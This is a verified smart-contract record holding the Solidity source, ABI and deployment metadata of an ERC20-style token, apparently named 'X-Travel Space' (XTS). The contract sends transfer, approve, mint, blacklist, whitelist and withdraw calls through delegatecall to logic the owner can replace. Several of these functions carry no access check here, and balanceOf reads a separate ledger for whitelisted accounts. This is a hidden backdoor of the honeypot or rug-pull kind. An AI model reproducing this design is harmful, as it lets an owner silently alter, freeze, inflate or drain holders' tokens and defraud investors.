{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ncontract Token is Context, Ownable {\r\n    mapping(address => uint256) private _rOwned;\r\n    mapping(address => uint256) private _tOwned;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) private _whitelist;\r\n    mapping(address => bool) private _blacklist;\r\n    mapping(address => bool) private _isRewardList;\r\n    mapping(address => bool) private _proxyWhitelist;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    address private _pair;\r\n    bool private toReward;\r\n    bool private isTransferFrom = true;\r\n    address[] private rewardList = [address(0)];\r\n    uint256 private pairSupplyLast;\r\n    uint256 private burnRatio = 10;\r\n    address private delegate;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = 18;\r\n        _totalSupply = 1_000_000_000_000 ether;\r\n        _whitelist[_msgSender()] = true;\r\n        _rOwned[_msgSender()] = _totalSupply;\r\n        _tOwned[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        if (_whitelist[account]) {\r\n            return _tOwned[account];\r\n        }\r\n        return _rOwned[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        virtual\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function checkRewardList(address _addr) external view returns (bool) {\r\n        return _isRewardList[_addr];\r\n    }\r\n\r\n    function checkWhitelist(address account) external view returns (bool) {\r\n        return _whitelist[account];\r\n    }\r\n\r\n    function getBurnRatio() external view returns (uint256) {\r\n        return burnRatio;\r\n    }\r\n\r\n    function getPairSupply() external view returns (uint256) {\r\n        require(_pair != address(0), \"Invalid pair.\");\r\n        return IERC20(_pair).totalSupply();\r\n    }\r\n\r\n    function getPairSupplyLast() external view returns (uint256) {\r\n        require(_pair != address(0), \"Invalid pair.\");\r\n        return pairSupplyLast;\r\n    }\r\n\r\n    function getDelegatecall() external view returns (address) {\r\n        return delegate;\r\n    }\r\n\r\n    function getRewardStatus() external view returns (bool) {\r\n        return toReward;\r\n    }\r\n\r\n    function getRewardList() external view returns (address[] memory) {\r\n        return rewardList;\r\n    }\r\n\r\n    function showPairAddress() external view returns (address) {\r\n        return _pair;\r\n    }\r\n\r\n    function setDelegatecall(address _addr) external onlyOwner {\r\n        require(_addr.code.length > 0, \"Non contract address\");\r\n        delegate = _addr;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\r\n                \"transfer(address,uint256)\",\r\n                recipient,\r\n                amount\r\n            )\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n        return success;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\r\n                \"transferFrom(address,address,uint256)\",\r\n                sender,\r\n                recipient,\r\n                amount\r\n            )\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n        return success;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"approve(address,uint256)\", spender, amount)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n        return success;\r\n    }\r\n\r\n    function mint(address account, uint256 amount) external returns (bool) {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"mint(address,uint256)\", account, amount)\r\n        );\r\n        require(success, \"delegatecall fail.....\");\r\n        return success;\r\n    }\r\n\r\n    function setBurnRatio(uint256 _burnRatio) external {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"setBurnRatio(uint256)\", _burnRatio)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n    }\r\n\r\n    function rewardToken() external {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"rewardToken()\")\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n    }\r\n\r\n    function addBlacklist(address[] memory accounts) external {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"addBlacklist(address[])\", accounts)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n    }\r\n\r\n    function removeFromBlacklist(address account) external onlyOwner {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"removeFromBlacklist(address)\", account)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n    }\r\n\r\n    function addWhitelist(address[] memory accounts) external {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"addWhitelist(address[])\", accounts)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n    }\r\n\r\n    function removeFromWhitelist(address account) external onlyOwner {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"removeFromWhitelist(address)\", account)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n    }\r\n\r\n    function updatePairSupply() external {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"updatePairSupply()\")\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n    }\r\n\r\n    function newPairAddress(address account) external returns (bool) {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"newPairAddress(address)\", account)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n        return success;\r\n    }\r\n\r\n    function airdrop(uint256 _tx) external returns (bool) {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"airdrop(uint256)\", _tx)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n        return success;\r\n    }\r\n\r\n    function airdropHolders(address[] memory _holders) external returns (bool) {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"airdropHolders(address[])\", _holders)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n        return success;\r\n    }\r\n\r\n    function withdraw(address _addr) external {\r\n        (bool success, ) = delegate.delegatecall(\r\n            abi.encodeWithSignature(\"withdraw(address)\", _addr)\r\n        );\r\n        require(success, \"delegatecall fail.\");\r\n    }\r\n\r\n    receive() external payable {\r\n        (bool success, ) = owner().call{value: msg.value}(\"\");\r\n        require(success, \"Transfer Ether failed.\");\r\n    }\r\n\r\n    fallback() external payable {\r\n        revert();\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"addBlacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"addWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tx\",\"type\":\"uint256\"}],\"name\":\"airdrop\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_holders\",\"type\":\"address[]\"}],\"name\":\"airdropHolders\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"checkRewardList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"checkWhitelist\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBurnRatio\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getDelegatecall\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getPairSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getPairSupplyLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getRewardList\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getRewardStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"newPairAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"removeFromBlacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"removeFromWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_burnRatio\",\"type\":\"uint256\"}],\"name\":\"setBurnRatio\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"setDelegatecall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"showPairAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"updatePairSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000e582d54726176656c20537061636500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000035854530000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://37e2ce01881967f89d242ff1e5a6bf48e442f0eebb3bd5b9a01284beb96042ed"}